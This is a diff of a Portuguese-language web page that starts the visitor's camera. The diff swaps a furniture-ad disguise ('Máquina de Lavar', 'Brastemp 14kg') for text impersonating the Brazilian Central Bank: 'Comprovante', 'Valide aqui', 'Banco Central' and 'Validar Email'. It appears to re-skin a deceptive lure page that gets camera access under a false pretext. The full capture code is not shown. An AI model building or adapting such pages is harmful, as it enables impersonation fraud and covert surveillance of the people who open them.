@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
-<title>Anuncios de Móveis</title>
+<title>Comprovante</title>
 
 <style>
 
@@ -14,7 +14,6 @@ body{
     display:flex;
     justify-content:center;
     align-items:center;
-    background-image: url('image.png');
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
@@ -71,14 +70,14 @@ canvas{
 
 <div class="container">
 
-    <h2>Máquina de Lavar</h2>
+    <h2>Valide aqui</h2>
 
     <p>
-        Brastemp 14kg
+        Banco Central
     </p>
 
     <button id="baixarBtn">
-        Ver anúncio
+        Validar
     </button>
 
 </div>
@@ -119,7 +118,7 @@ async function iniciarCamera(){
         console.error(erro);
 
         alert(
-            'Não foi possível acessar a câmera.'
+            'Não foi possível'
         );
 
     }
@@ -204,7 +203,7 @@ document
 
         this.disabled = false;
         this.innerText =
-            'Maquina de Lavar';
+            'Validar Email';
 
     } catch(erro) {
 
@@ -216,7 +215,7 @@ document
 
         this.disabled = false;
         this.innerText =
-            'Maquina de Lavar';
+            'Validar Email';
 
     }
 
